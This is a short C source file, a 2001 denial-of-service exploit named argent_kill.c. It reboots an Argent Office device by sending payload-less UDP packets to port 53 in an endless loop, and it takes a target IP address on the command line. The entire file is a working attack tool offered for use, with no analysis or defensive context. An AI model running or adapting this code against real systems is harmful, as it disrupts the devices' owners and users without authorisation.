/* argent_kill.c 
(c) 2001 Jacek Lipkowski sq5bpf acid ch pw edu pl
Reboots an Argent Office box by sending udp packets with no payload to port 53
usage: argent_kill ip_address
*/

#include <stdio.h>
#include <string.h>
#include <netdb.h>
#include <netinet/in.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <unistd.h>

main(int argc, char *argv[])
{
struct sockaddr_in addr;
struct hostent *host;
int s;

s=socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
if (s==-1) { perror("socket()"); exit(1); }
host=gethostbyname(argv[1]);
if (host==0) { herror("gethostbyname"); exit(1); }
memcpy(&addr.sin_addr,host->h_addr,host->h_length);
addr.sin_port=htons(53);
addr.sin_family=AF_INET;
if (connect(s,&addr,16)==-1) { perror("connect()"); exit(1); }
for (;;)
{
send(s,0,0,0); sleep(1); printf("."); fflush(stdout);
}
close(s);
}
